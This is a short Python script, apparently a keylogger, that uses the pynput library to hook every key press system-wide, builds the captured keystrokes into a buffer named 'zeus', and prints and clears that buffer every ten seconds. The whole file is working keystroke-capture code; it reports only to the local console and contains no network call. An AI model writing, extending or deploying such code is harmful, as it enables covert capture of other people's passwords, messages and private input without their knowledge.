#!/usr/bin/python
import pynput.keyboard
import threading

zeus = ""

def process_keys(key):
	global zeus
	try:
		zeus = zeus + str(key.char)
	except AttributeError:
		if key == key.space:
			zeus = zeus + " "	
		elif key == key.enter:
			zeus = zeus + ""
		elif key == key.right:
			zeus = zeus + ""
		elif key == key.left:
			zeus = zeus + ""
		elif key == key.up:
			zeus = zeus + ""
		elif key == key.down:
			zeus = zeus + "" 
		else:
			zeus = zeus + " " + str(key) + " "

def report():
	global zeus
	print(zeus)
	zeus = ""
	timer = threading.Timer(10, report)
	timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
with keyboard_listener:
	report()
	keyboard_listener.join()
